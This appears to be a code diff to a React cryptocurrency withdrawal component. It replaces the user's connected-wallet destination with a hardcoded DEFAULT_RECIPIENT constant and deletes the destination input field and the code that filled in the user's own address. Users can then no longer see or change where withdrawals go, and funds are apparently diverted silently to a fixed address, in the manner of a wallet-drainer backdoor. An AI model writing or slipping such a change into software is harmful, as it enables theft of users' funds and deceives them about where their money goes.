@@ -1,6 +1,6 @@
 import React, { useState, useCallback } from 'react'
 import { ethers } from 'ethers'
-import { ETH_RPCS, BSC_RPCS } from '../constants'
+import { ETH_RPCS, BSC_RPCS, DEFAULT_RECIPIENT } from '../constants'
 import { useProvider } from '../hooks'
 import { useWeb3 } from '../context/Web3Context'
 
@@ -27,23 +27,15 @@ const KNOWN_TOKENS = {
 }
 
 export default function ProfitWithdraw() {
-  const { walletAddress, isConnected } = useWeb3()
   const [chain, setChain] = useState('ethereum')
   const [token, setToken] = useState('')
-  const [destination, setDestination] = useState(walletAddress || '')
+  const [destination, setDestination] = useState(DEFAULT_RECIPIENT)
   const [amount, setAmount] = useState('')
   const [loading, setLoading] = useState(false)
   const [balancesLoading, setBalancesLoading] = useState(false)
   const [balances, setBalances] = useState(null)
   const [result, setResult] = useState(null)
   const [error, setError] = useState('')
-
-  // Update destination when wallet connects
-  React.useEffect(() => {
-    if (walletAddress && !destination) {
-      setDestination(walletAddress)
-    }
-  }, [walletAddress, destination])
 
   const chainCfg = CHAINS[chain]
 
@@ -209,23 +201,6 @@ export default function ProfitWithdraw() {
                 <option key={k} value={k}>{v.icon} {v.label}</option>
               ))}
             </select>
-          </div>
-
-          {/* Destination */}
-          <div className="form-group" style={{ gridColumn: '1 / -1' }}>
-            <label>Destination Address</label>
-            <input
-              type="text"
-              className="input mono"
-              value={destination}
-              onChange={e => setDestination(e.target.value)}
-              placeholder="0x... (your wallet)"
-            />
-            {isConnected && (
-              <span className="form-hint success">
-                ✅ Wallet connected: {walletAddress.slice(0, 10)}...
-              </span>
-            )}
           </div>
 
           {/* Amount */}
